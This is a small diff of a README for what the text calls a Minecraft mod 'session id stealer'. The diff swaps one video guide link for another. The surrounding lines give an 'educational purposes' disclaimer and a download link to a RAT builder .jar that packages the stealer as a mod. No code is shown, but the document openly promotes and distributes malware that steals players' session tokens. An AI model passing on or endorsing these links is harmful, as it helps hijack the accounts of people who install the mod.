@@ -2,7 +2,7 @@
 ## Hi heres the code to my minecraft mod session id stealer
 ## This is purely for educational purposes and i am not responsible for any damage caused by this code.
 
-# Guide: https://youtu.be/cvbRKPJeOGs
+# Guide: https://www.youtube.com/watch?v=yu7KSym8iCU
 
 ### to turn this code into a .jar minecraft mod use the rat builder .jar file: https://github.com/maksvavrik1/Minecraft-Token-Stealer/releases/download/builder/Rat_Builder.jar
 
